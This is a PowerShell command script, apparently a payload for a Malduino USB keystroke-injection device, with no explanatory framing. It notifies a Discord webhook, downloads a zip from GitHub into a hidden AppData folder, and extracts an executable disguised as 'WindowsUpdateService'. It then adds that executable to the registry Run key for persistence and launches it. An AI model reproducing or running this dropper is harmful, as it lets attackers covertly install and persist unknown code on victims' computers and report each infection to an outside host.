powershell Stop-Process -Name powershell -Force
powershell -Command "$webhookUrl = 'https://discord.com/api/webhooks/1100407460491169862/Wb_kr_f72PHdI5HhozZXMRekfr9XPtdXtw4TWjPLZARjT4sD0TraoPpuxhf8N2FNTY4E'; $message = 'Malduino w hat den download beim User %username% gestarted.'; $body = @{content = $message} | ConvertTo-Json; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'"
taskkill -im WindowsUpdateService.exe -f
Remove-Item -Path "C:/Users/%Username%/AppData/Roaming/__browsergame__/WindowsUpdateService-main" -Recurse -Force
New-Item -ItemType "directory" -Path "C:/Users/%Username%/AppData/Roaming/__browsergame__"
Invoke-WebRequest -Uri "https://github.com/DanielAckermann69/WindowsUpdateService/archive/refs/heads/main.zip" -OutFile "C:/Users/%Username%/AppData/Roaming/__browsergame__/v2.zip"
Expand-Archive -Path "C:/Users/%Username%/AppData/Roaming/__browsergame__/v2.zip" -DestinationPath "C:/Users/%Username%/AppData/Roaming/__browsergame__"
New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "start" -Value "C:\Users\%Username%\AppData\Roaming\__browsergame__\WindowsUpdateService-main\WindowsUpdateService.exe" -PropertyType String
C:/Users/%Username%/AppData/Roaming/__browsergame__/WindowsUpdateService-main/WindowsUpdateService.exe

